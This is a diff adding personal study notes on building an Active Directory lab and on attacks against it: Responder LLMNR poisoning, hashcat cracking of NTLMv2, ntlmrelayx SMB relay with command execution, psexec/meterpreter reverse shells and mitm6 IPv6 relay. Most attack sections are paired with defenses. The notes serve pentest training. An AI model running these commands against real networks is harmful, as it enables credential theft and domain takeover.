@@ -274,10 +274,205 @@ Objects - User - enables net recs access for user
         - Printers - simplify location and connection to printers
         - Shared folders - enables users search for shared folders based on properties
 
-
-
-#AD lab
+#AD lab build
 https://learn.microsoft.com/en-us/training/modules/introduction-to-ad-ds/3-define-users-groups-computers
+
+DC setup
+server(DC) - std desktop exp, 2gb, NAT
+use admin acc
+rename pc(anything-dc)
+manage - add roles - server roles - AD services - install
+promote to DC - add new forest(anything.local)
+directory services restore mode password
+install
+
+machine setup
+NAT, 2gb
+rename pc(anything)
+
+Setting Up Users, Groups, and Policies
+tools - ad users/comps - create users
+
+shares(smb 139,445)
+file storage services - share - smb quick - name
+
+service pn
+cmd(admin) - setspn -a anything-dc/sqlservice.marvel.local:60111 marvel/sqlservice
+           - setspn -T marvel.local -Q */*
+
+group policy man(admin)
+domain - create gpo(disable defender) - edit - comp config - policies - adm templ - win compo - defender - turn off(enable, apply)
+scope - (enforced = yes)
+
+join machines to domain
+fake empty share on C://
+set dns server ip to DC
+joint local ad
+login marvel\administrator
+add admin users - comp mangmnt
+confirm from dc
+turn on discovery and file sharing
+
+Initial attack vectors
+https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa
+
+LLMNR Poisoning
+linked local multicast name resolution(formerly NBT-NS)
+identify hosts when dns fails
+responds with user's username and NTLMv2 hash
+python3 /usr/share/responder/Responder.py -I wlo1 -rdwv(run in morning/afterlunch, when ppl are starting traffic/services)/ responder -I wlo1 -rdwv
+access share(\\ip)
+
+cracking NTLMv2 hash with hashcat
+hashcat --help | grep -i ntlm
+hashcat -m 5600 hash.txt rockyou.txt --force -O
+
+LLMNR poisoning defense
+disable LLMNR(local comp policy-comp config-admin teml-net-dns client in group policy editor-multicast name resolution)
+disable NBT-NS(net adapter settings-tcp/ipv4 properties-advanced-wins-diasble NetBios over tcp/ip)
+if must use:
+       -require net access control
+       -strong user pass(>14chars,no commons words)
+
+SMB Relay attacks
+relay hashes gathered with responder to specific machines
+       SMB signing must be disabled on target
+       relayed user creds must be admin on machine relayed to
+change responder config to listen but don't respond
+       http and smb servers - off
+       edit /etc/responder/Responder.cong
+       turn off SMB and HTTP
+       python3 /usr/share/responder/Responder.py -I wlo1 -rdwv
+setup relay
+       python3 ntlmrelayx.py(or impacket) -tf targets.txt -smb2support
+access share
+
+Discover hosts with smb signing disabled(or not required)
+nessus scan
+github SMB signing chack scripts
+nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
+
+attack
+If SMB is failing to relay, attempt to navigate to the attacker’s IP address from a web browser (such as \192.168.10.1)
+instead of the SMB event. You should trigger a relay.
+edit /etc/responder/Responder.cong
+       turn off SMB and HTTP
+python3 /usr/share/responder/Responder.py -I wlo1 -rdwv
+setup relay
+       python3 ntlmrelayx.py(or impacket) -tf targets.txt -smb2support
+access share(\\ip)
+dumped haches(crack or pass them)
+SMB shell(tcp)
+       python3 ntlmrelayx.py(or impacket) -tf targets.txt -smb2support -i
+       help
+       shares
+       use sharename
+       python3 ntlmrelayx.py(or impacket) -tf targets.txt -smb2support -c "command"
+
+SMB relay defense
+enable SMB signing on all devices(causes issues with file copies)
+disable NTLM authentication on network(if kerberos stops working, wins defaults to back NTLM)
+account tiering(limits domain admins to specific tasks)
+local admin restriction(increased service desk tickets)
+
+Gain shell access
+msf-psexec-set smbdoamin,user,password,payload windows/x64/meterpreter/reverse_tcp,targets
+impacket-psexec marvel.local/fcastle:password123@192.168.57.2
+impacket-smbexec
+impacket-wmiexec
+
+IPv6 attacks
+DNS
+mitm6 - https://github.com/dirkjanm/mitm6
+
+set up LDAPS(secure)
+manage-add roles-ad certificate services,NET features-install
+open exclamtn-configure-cert authority-enterprise CA-root-new priv key-sha256-99 years-configure(reboot)
+mitm6: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
+Combining NTLM Relays and Kerberos Delegation: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
+ntlmrelayx is giving an error
+Impacket versions > 0.9.19 are unstable and causing issues. 
+Try purging impacket completely and downloading 0.9.19 from here: https://github.com/SecureAuthCorp/impacket/releases
+mitm6 -d marvel.local
+set relay
+       python3 ntlmrelayx.py(or impacket) -6 -t ldaps://dcIP -wh fakewpad.marvel.local -l lootme
+restart comp to speed up
+cd lootme
+ls
+firefox domain_users_by_group.html
+
+IPv6 Attack Defenses
+wins queries ipv6 address in ipv4 only environs
+-block DHCPv6 traffic and incoming router advertisements in firewalll via group policy
+-if WPAD is not in use internally, disable it via group policy and disable WinHttpAutoProxySvc service
+-enable both LDAP signing and LDAP channel binding to mitigate relaying to LDAP(s)
+-prevent user impersonation via delegation:
+       -considering admin users to protected users group
+       -mark them as Account is sensitive and cannot be delegated
+
+Passback attacks
+printers/iot
+https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/
+
+Other attack vectors and strategies
+mitm6 and responder
+run scans(nessus,sweeps,msf(http_version)..) to generate traffic
+look for websites in scope if scans take too long
+default creds in printers, jenkins, etc
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
